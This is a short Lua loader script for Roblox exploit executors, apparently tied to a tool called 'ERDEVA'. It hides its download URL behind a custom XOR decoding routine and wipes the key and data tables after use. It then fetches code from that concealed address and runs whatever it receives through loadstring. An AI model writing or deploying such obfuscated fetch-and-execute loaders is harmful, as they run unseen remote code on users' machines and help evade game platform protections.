local _f = (request or http_request or (syn and syn.request) or (fluxus and fluxus.request) or (http and http.request))
local _k = {147,202,233,181,99,142,210,77,163,88}
local _d = {243,182,149,213,41,237,173,62,209,42,175,185,131,213,41,239,182,62,197,34,185,163,149,213,41,239,183,62,198,40,185,163,131,213,41,239,183,62,195,40,185,174,131,213,41,237,178,62,209,46,177,184,149,213,41,239,183,62,195,40,185,163,149,213,41,239,183,62,195,40}

local function _dec()
    local s = {}
    for i = 1, #_d do
        local key = _k[((i - 1) % #_k) + 1]
        local a, b = _d[i], key
        local r, m = 0, 1
        while a > 0 or b > 0 do
            local ra, rb = a % 2, b % 2
            if ra ~= rb then r = r + m end
            a, b, m = (a - ra) / 2, (b - rb) / 2, m * 2
        end
        s[#s + 1] = string.char(r)
    end
    table.clear(_d)
    table.clear(_k)
    return table.concat(s)
end

local _url = _dec()

if _f then
    local res = _f({
        Url = _url,
        Method = "GET",
        Headers = {
            ["User-Agent"] = "Roblox/ERDEVA"
        }
    })
    _url = nil
    if res and (res.StatusCode == 200 or res.Status == 200) and res.Body and #res.Body > 20 then
        local fn, err = loadstring(res.Body)
        if fn then
            fn()
        else
            warn("[ERDEVA] Syntax Error: " .. tostring(err))
        end
    else
        warn("[ERDEVA] Server Connection Failed!.")
    end
else
    warn("[Erorrr.")
end
